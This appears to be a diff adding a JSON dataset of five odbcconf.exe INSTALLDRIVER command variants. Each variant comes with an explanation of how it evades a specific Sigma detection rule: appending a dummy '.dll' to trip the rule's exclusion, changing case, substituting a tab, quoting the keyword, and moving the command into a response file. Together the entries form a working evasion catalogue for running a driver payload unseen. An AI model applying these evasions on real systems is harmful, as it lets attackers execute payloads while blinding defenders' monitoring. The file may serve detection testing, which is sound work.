@@ -1,0 +1,22 @@
+[
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER \"MyDriver|C:\\Temp\\test.dat\"} .dll",
+    "explanation": "Other technique (Filter Abuse). Appends a meaningless `.dll` string inside an ignored parameter space or comment block at the end of the command line. This directly satisfies the `filter_main_dll_ext` condition (`CommandLine|contains: '.dll'`), forcing the SIEM engine to drop the alert via the exclusion logic while `odbcconf.exe` still executes the target payload path (`.dat`)."
+  },
+  {
+    "output": "odbcconf.exe /A {installdriver \"MyDriver|C:\\Temp\\test.dat\"}",
+    "explanation": "Substitution technique. Modifies the character casing of the driver configuration action verb from uppercase to lowercase (`installdriver`). The Sigma rule uses a standard `CommandLine|contains` match for the explicit string 'INSTALLDRIVER ' without an explicit case-insensitive modifier. If the target SIEM backend evaluates string lookups case-sensitively by default, this completely evades detection while `odbcconf.exe` natively handles verbs case-insensitively."
+  },
+  {
+    "output": "odbcconf.exe /A {INSTALLDRIVER\t\"MyDriver|C:\\Temp\\test.dat\"}",
+    "explanation": "Substitution technique. Replaces the standard trailing blank space after the action keyword with a horizontal tab (`\t`) character. This breaks the literal selection requirement `INSTALLDRIVER ` (which strictly mandates a standard space suffix), whereas the internal parser of `odbcconf.exe` treats the tab as a valid token delimiter."
+  },
+  {
+    "output": "odbcconf.exe /A {\"INSTALLDRIVER\" \"MyDriver|C:\\Temp\\test.dat\"}",
+    "explanation": "Insertion technique. Encloses the `INSTALLDRIVER` keyword inside individual double quotation marks. This breaks up the continuous raw character sequence expected by the `selection_cli` string match, while the application's argument subsystem safely strips the structural quotes during tokenization."
+  },
+  {
+    "output": "odbcconf.exe /F C:\\Temp\\response.rsp",
+    "explanation": "Other technique (Response File Indirect Execution). Relocates the malicious `INSTALLDRIVER` syntax into a separate configuration response script file (`/F`) rather than exposing it on the raw command line. This completely purges the keyword `INSTALLDRIVER ` from the process creation `CommandLine` log field, blinding the current rule's detection visibility entirely."
+  }
+]
